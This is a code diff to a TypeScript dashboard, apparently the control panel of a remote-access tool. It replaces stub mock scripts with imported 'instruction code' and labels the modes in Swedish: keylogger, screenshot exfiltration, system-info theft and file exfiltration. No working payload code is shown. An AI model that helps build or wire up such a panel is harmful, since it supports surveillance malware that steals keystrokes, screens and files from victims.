@@ -46,25 +46,17 @@ const MOCK_CLIENTS: ClientInstruction[] = [
   }
 ];
 
-// Mock scripts data to use when API is not available
-const MOCK_SCRIPTS_DATA: ScriptsData = {
-  "standard": "# Standard instruktioner - logga tangenttryckningar\nimport platform\nimport getpass\n# ... more code here",
-  "keylogger": "# Instruktion: Keylogger-läge - Registrera och skicka tangenttryckningar\nimport platform\nimport getpass\n# ... more code here",
-  "screenshot": "# Instruktion: Screenshot-läge - Ta och skicka skärmdumpar\nimport platform\nimport getpass\n# ... more code here",
-  "system_info": "# Instruktion: System Info-läge - Samla och skicka systeminformation\nimport platform\nimport getpass\n# ... more code here",
-  "file_exfiltration": "# Instruktion: File Exfiltration-läge - Hitta och exfiltrera specifika filtyper\nimport platform\nimport getpass\n# ... more code here",
-};
+import { INSTRUCTION_CODE } from './scriptData';
 
 // Extract scripts from instructions.py
 export async function extractScriptsFromInstructionsPy(): Promise<ScriptsData> {
   // In a real app, this would parse the Python file server-side
-  // For now, we're returning mock data based on the file content
+  // For now, we're returning the actual instruction code from instructions.py
   try {
-    // This is a mock - in a real app, this would be a proper API call to get Python content
     console.log("Mock import of instructions.py");
     
-    // Return the mock data directly
-    return MOCK_SCRIPTS_DATA;
+    // Return the actual instruction code
+    return INSTRUCTION_CODE;
   } catch (error) {
     console.error("Error extracting scripts:", error);
     // Fallback to simplified values if needed
@@ -95,7 +87,7 @@ export async function getScripts(): Promise<ScriptsData> {
       return data;
     } catch (error) {
       console.warn("API returned non-JSON response, using mock data instead");
-      return MOCK_SCRIPTS_DATA;
+      return INSTRUCTION_CODE;
     }
   } catch (error) {
     console.error("Error fetching scripts:", error);
